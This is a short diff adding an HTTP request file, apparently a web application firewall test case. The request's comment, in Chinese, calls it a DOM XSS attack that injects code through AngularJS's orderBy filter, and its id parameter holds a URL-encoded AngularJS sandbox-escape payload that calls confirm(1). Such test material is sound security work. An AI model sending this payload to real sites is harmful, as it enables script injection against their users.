@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_DOM-06506762
+# 在 AngularJS 的 orderBy 过滤器中注入恶意代码
+GET /?id=a%27.constructor.prototype.charAt=%5B%5D.join%3B%5B1%5D%7CorderBy:%27x=1%7D%20%7D%20%7D%3Bconfirm%281%29%2F%2F%27%3B&bid=hd_tag_m8mv25d6 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25d6
+RM-PRO-Token: ee24e1b99849f0bbf281a9ba0da01f36
+RM-PRO-Time: 1742808461309
+User-Agent: curl/7.83.1
+
